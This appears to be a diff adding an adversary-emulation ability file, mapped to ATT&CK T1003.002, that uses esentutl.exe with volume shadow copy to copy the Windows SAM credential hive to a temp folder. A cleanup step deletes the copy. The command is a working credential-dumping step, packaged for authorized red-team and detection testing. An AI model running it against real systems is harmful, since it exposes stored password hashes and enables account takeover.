@@ -1,0 +1,18 @@
+---
+- id: d21b4ae13ee85560eb6b82c5c9150ae7
+  name: esentutl.exe SAM copy
+  description: 'Copy the SAM hive using the esentutl.exe utility
+
+    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      cmd:
+        command: esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+        payloads: []
+        cleanup: del %temp%\SAM >nul 2>&1
